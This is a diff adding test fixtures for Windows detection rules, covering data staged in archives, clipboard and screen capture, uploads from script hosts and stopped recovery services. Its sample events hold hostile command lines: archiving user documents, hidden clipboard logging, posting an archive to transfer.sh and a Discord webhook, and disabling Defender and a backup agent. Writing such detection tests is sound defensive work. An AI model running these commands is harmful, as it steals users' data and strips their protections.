@@ -383,3 +383,79 @@ win_domain_recon:
         Image: C:\Windows\System32\whoami.exe
         CommandLine: whoami
   also_fires: []
+
+win_data_staged_in_archive:
+  matches:
+    - name: a password-protected archive in Temp
+      event:
+        Image: C:\Windows\System32\rar.exe
+        CommandLine: rar.exe a -hp7Gh2 C:\Windows\Temp\out.rar C:\Users\jdoe\Documents
+    - name: Compress-Archive writing to the public profile
+      event:
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: powershell -c "Compress-Archive -Path C:\Finance -DestinationPath C:\Users\Public\f.zip"
+  ignores:
+    - name: an installer unpacking beside itself
+      event:
+        Image: C:\Program Files\7-Zip\7z.exe
+        CommandLine: 7z.exe x setup.7z -oC:\Program Files\App
+  also_fires: []
+
+win_clipboard_and_screen_captured:
+  matches:
+    - name: the clipboard read in a loop from a hidden shell
+      event:
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: powershell.exe -nop -w hidden -c "while($true){Get-Clipboard | Out-File -Append C:\Users\Public\c.txt; Start-Sleep 5}"
+    - name: the screen copied into a bitmap
+      event:
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: powershell -c "$g=[Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0,0,0,0,$s)"
+  ignores:
+    - name: a helper setting the clipboard rather than reading it
+      event:
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: powershell -c "Set-Clipboard -Value 'deploy done'"
+  also_fires: []
+
+win_upload_from_script_host:
+  matches:
+    - name: the archive posted to a transfer service
+      event:
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: powershell.exe -c "Invoke-RestMethod -Uri https://transfer.sh/out.rar -Method Post -InFile C:\Windows\Temp\out.rar"
+    - name: a webhook used as a drop point
+      event:
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: powershell -c "iwr https://discord.com/api/webhooks/1/x -Body $d"
+  ignores:
+    - name: fetching an update rather than sending one
+      event:
+        Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+        CommandLine: powershell -c "Invoke-WebRequest https://vendor.example/patch.msi -OutFile C:\Temp\patch.msi"
+  # The drop-service list is shared with the Linux rule on purpose: a
+  # paste site does not care which operating system reached it.
+  also_fires:
+    - linux_file_pushed_offhost
+
+win_recovery_services_stopped:
+  matches:
+    - name: endpoint protection stopped
+      event:
+        Image: C:\Windows\System32\net.exe
+        CommandLine: net.exe stop WinDefend /y
+    - name: the backup agent disabled at boot
+      event:
+        Image: C:\Windows\System32\sc.exe
+        CommandLine: sc.exe config Veeam start= disabled
+  ignores:
+    - name: restarting an unrelated service
+      event:
+        Image: C:\Windows\System32\net.exe
+        CommandLine: net.exe stop Spooler
+  # Correct. `win_defender_exclusion_added` has its own branch for
+  # stopping WinDefend, and the two rules describe the same act from
+  # different angles - evasion there, preparation for impact here.
+  # Either alone is worth seeing.
+  also_fires:
+    - win_defender_exclusion_added
